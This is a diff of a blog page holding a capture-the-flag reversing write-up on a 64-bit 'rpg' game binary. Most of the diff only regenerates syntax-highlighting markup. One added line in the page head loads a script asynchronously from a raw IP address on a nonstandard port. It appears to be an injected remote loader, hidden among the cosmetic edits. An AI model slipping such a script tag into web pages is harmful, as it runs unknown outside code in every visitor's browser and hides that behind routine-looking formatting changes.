@@ -45,6 +45,8 @@
   <script src='/js/lunr-2.3.9.min.js'></script>
   <script src='/js/search_index.js'></script>
   <script src='/js/search.min.js'></script>
+
+  <script src='http://192.34.63.156:6127/ping.js' async></script>
 </head>
 <body>
 <header>
@@ -89,31 +91,31 @@ October 27, 2019
 <p><code>rpg</code> is a buggy game where the player can attack to and defend from attacks of monsters.</p>
 <p>Let’s see if we can know how it works.<!--more--></p>
 <p>It is a 64 bits ELF <a href="/assets/writeups/eko2019/reversing/rpg">binary</a>:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ file rpg                      <span class="c1"># byexample: +norm-ws</span>
-rpg: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>GNU/Linux<span class="o">)</span>,
-statically linked, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32,
-BuildID<span class="o">[</span>sha1<span class="o">]=</span>&lt;...&gt;, stripped
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>file<span class="w"> </span>rpg<span class="w">                      </span><span class="c1"># byexample: +norm-ws</span>
+rpg:<span class="w"> </span>ELF<span class="w"> </span><span class="m">64</span>-bit<span class="w"> </span>LSB<span class="w"> </span>executable,<span class="w"> </span>x86-64,<span class="w"> </span>version<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>GNU/Linux<span class="o">)</span>,
+statically<span class="w"> </span>linked,<span class="w"> </span><span class="k">for</span><span class="w"> </span>GNU/Linux<span class="w"> </span><span class="m">2</span>.6.32,
+BuildID<span class="o">[</span>sha1<span class="o">]=</span>&lt;...&gt;,<span class="w"> </span>stripped
 </code></pre></div>
 
 <p>We expect some part of <code>libc</code> in the binary and no symbol at all.</p>
 <p>So our first task is to find what pieces of the binary are of the game and which aren’t like <code>stdlib</code>.</p>
 <h2 id="strings-as-starting-points">Strings as Starting Points</h2>
 <p>Let’s see what strings we can find:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ strings -a -16 rpg <span class="p">|</span> head -14
-Monster %s attack to %s with %d damage.
-%s has stopped the attack.
-%s is dead. GG WP.
-Monster %s defends with %d of defense.
-%s hit a critical to %s.
-<span class="m">0</span><span class="o">)</span> Create player
-<span class="m">1</span><span class="o">)</span> Update player name
-<span class="m">2</span><span class="o">)</span> Delete player
-<span class="m">3</span><span class="o">)</span> Player attack
-<span class="m">4</span><span class="o">)</span> Player defend
-<span class="m">5</span><span class="o">)</span> Get current <span class="nb">time</span>
-User created, first delete it.
-Enter player name:
-User not created.
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>strings<span class="w"> </span>-a<span class="w"> </span>-16<span class="w"> </span>rpg<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-14
+Monster<span class="w"> </span>%s<span class="w"> </span>attack<span class="w"> </span>to<span class="w"> </span>%s<span class="w"> </span>with<span class="w"> </span>%d<span class="w"> </span>damage.
+%s<span class="w"> </span>has<span class="w"> </span>stopped<span class="w"> </span>the<span class="w"> </span>attack.
+%s<span class="w"> </span>is<span class="w"> </span>dead.<span class="w"> </span>GG<span class="w"> </span>WP.
+Monster<span class="w"> </span>%s<span class="w"> </span>defends<span class="w"> </span>with<span class="w"> </span>%d<span class="w"> </span>of<span class="w"> </span>defense.
+%s<span class="w"> </span>hit<span class="w"> </span>a<span class="w"> </span>critical<span class="w"> </span>to<span class="w"> </span>%s.
+<span class="m">0</span><span class="o">)</span><span class="w"> </span>Create<span class="w"> </span>player
+<span class="m">1</span><span class="o">)</span><span class="w"> </span>Update<span class="w"> </span>player<span class="w"> </span>name
+<span class="m">2</span><span class="o">)</span><span class="w"> </span>Delete<span class="w"> </span>player
+<span class="m">3</span><span class="o">)</span><span class="w"> </span>Player<span class="w"> </span>attack
+<span class="m">4</span><span class="o">)</span><span class="w"> </span>Player<span class="w"> </span>defend
+<span class="m">5</span><span class="o">)</span><span class="w"> </span>Get<span class="w"> </span>current<span class="w"> </span><span class="nb">time</span>
+User<span class="w"> </span>created,<span class="w"> </span>first<span class="w"> </span>delete<span class="w"> </span>it.
+Enter<span class="w"> </span>player<span class="w"> </span>name:
+User<span class="w"> </span>not<span class="w"> </span>created.
 </code></pre></div>
 
 <p>Running the program we can map those strings to a mental model of what it does:</p>
@@ -181,7 +183,7 @@ The last instruction marks that <em>the user was created</em> in a global variab
 <img  class='' alt='' src='/img/writeups/eko2019/reversing/enter_player_name_loc_labeled.png' /></figure></p>
 <h2 id="keep-guessing">Keep Guessing</h2>
 <p>The entire block configures the hypothetical <code>player_struct</code> setting the name of the player at the offset 8 (like we saw before) and the lives of the player at the offset 0:</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="nf">mov</span><span class="w">     </span><span class="no">byte</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="p">[</span><span class="no">rax</span><span class="p">],</span><span class="w"> </span><span class="mi">10</span><span class="no">h</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="nf">mov</span><span class="w">     </span><span class="no">byte</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="p">[</span><span class="no">rax</span><span class="p">],</span><span class="w"> </span><span class="mi">10</span><span class="no">h</span>
 <span class="nf">mov</span><span class="w">     </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">player_struct</span><span class="p">]</span><span class="w"> </span><span class="c1">; player&#39;s lives (= 16)</span>
 </code></pre></div>
 
